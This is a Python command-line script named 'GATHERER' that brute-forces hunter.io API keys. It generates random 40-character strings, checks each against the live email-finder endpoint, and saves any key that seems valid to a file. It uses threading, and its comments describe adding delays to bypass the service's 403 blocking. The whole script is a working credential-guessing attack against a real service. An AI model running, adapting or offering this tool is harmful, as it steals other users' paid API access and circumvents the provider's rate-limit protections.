import hashlib
import os
import random
import requests
import string
import threading
import time


# COLOURS FOR TEXT

class Colour:
    Green = "\u001b[32m"
    Yellow = "\u001b[33m"
    Blue = "\u001b[34m"
    Magenta = "\u001b[35m"
    White = "\u001b[37m"


def logo():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colour.Magenta + "\033[1m▒▒▒▒▒ GATHERER ▒▒▒▒▒\033[0m")
    print()


# FUNCTIONS

def save_to_file(strings, filename):
    with open(filename, 'a') as file:
        for s in strings:
            file.write(s + '\n')


''' def keygen(number_of_symbols): #old, without hashlib
    random_api_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=number_of_symbols))
	url = "https://api.hunter.io/v2/email-finder?domain=gmail.com&first_name=test&last_name=test&api_key=" + random_api_key
	# print("Trying " + unique_key + "...", end=" ") # to write in one string with request result
	print("Trying " + random_api_key + "...")
	donecheck = requests.get(url)
	if donecheck.status_code == 400:
		save_to_file([random_api_key + " "], "hunter_key.txt")
		print()
		print("\033[1mKey picked and saved to 'hunter_key.txt'\033[0m")
		print()
	elif donecheck.status_code == 429:
		print("You've reached the limit for the number of searches per billing period included in your plan (too_many_requests 429)")
	else:
		print("An error occurred with status code:", donecheck.status_code) '''


def generate(number_of_symbols):
    random_api_key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=number_of_symbols))
    unique_key = hashlib.sha256(random_api_key.encode()).hexdigest()[
                 :number_of_symbols]  # hashlib for unique symbol combinations
    return unique_key


def check(key):
    url = "https://api.hunter.io/v2/email-finder?domain=gmail.com&first_name=test&last_name=test&api_key=" + key
    try:
        donecheck = requests.get(url)
        if donecheck.status_code == 400:  # error 401 says about wrong API key. set 401 to test key saving
            save_to_file([key + " "],
                         "hunter_key.txt")  # error 400 says about wrong domain but existing API key, so it can be used to define the right key
            print(f"\033[1mKey {key} picked and saved to 'hunter_key.txt'\033[0m")
        elif donecheck.status_code == 403:  # server forbidding the request
            print("\033[1mForbidden (403)\033[0m")
            while donecheck.status_code == 403:  # trying the same key if 403 error
                time.sleep(0.5)  # lowering request frequency
                check(key)
    except KeyboardInterrupt:
        print()
    except Exception as e:
        print("An error occurred:", e)


def keygen_unique(number_of_symbols):
    key = generate(number_of_symbols)
    check(key)


# MAIN MENU

def main_menu():
    try:
        print(Colour.Yellow + "\033[1mMain menu:\033[0m")
        print(Colour.Yellow + "\033[1m[1] - hunter.io API key finder\033[0m")
        print(Colour.Yellow + "\033[1m[0] - Exit\033[0m")
        print()
        print(Colour.Yellow + "\033[1m[i] - Instructions\033[0m")
        print()

        choice = input(Colour.Yellow + "\033[1m=> \033[0m").strip()

        if choice == "1":
            print("\nTrying...\n")
            try:
                # keygen_unique(40) # old
                num_threads = 2  # threading for a bit higher speed, not recommended to set more than 2
                while True:
                    threads = []
                    for _ in range(num_threads):
                        thread = threading.Thread(target=keygen_unique, args=(40,))
                        threads.append(thread)
                        thread.start()
                        time.sleep(0.1)  # limiting request frequency to bypass error 403
                    for thread in threads:
                        thread.join()

            except KeyboardInterrupt:
                print("Operation cancelled by user (KeyboardInterrupt exception)")
                input("\033[1mPress Enter to continue\033[0m")
                logo()
                main_menu()

        elif choice == "i":
            print(
                "\033[1mManual usage for Email finder:" + Colour.Magenta + "https://api.hunter.io/v2/email-finder?domain=" + Colour.Yellow + "[DOMAIN]" + Colour.Magenta + "&first_name=" + Colour.Yellow + "[FIRST NAME]" + Colour.Magenta + "&last_name=" + Colour.Yellow + "[LAST NAME]" + Colour.Magenta + "&api_key=" + Colour.Yellow + "[YOUR API KEY]\033[0m")
            print(
                "\033[1mPress " + Colour.Yellow + "'Ctrl+C'" + Colour.White + " to stop the work of key generator.\033[0m")
            input("\033[1m'Enter' to return to main menu.\033[0m")
            logo()
            main_menu()

        elif choice == "0":
            print("\033[1mGoodbye!\033[0m")
            exit()

        else:
            logo()
            main_menu()
    except KeyboardInterrupt:
        print("\nScript interrupted by user.")
        logo()
        main_menu()


# STARTING SCRIPT

if __name__ == "__main__":
    logo()
    main_menu()
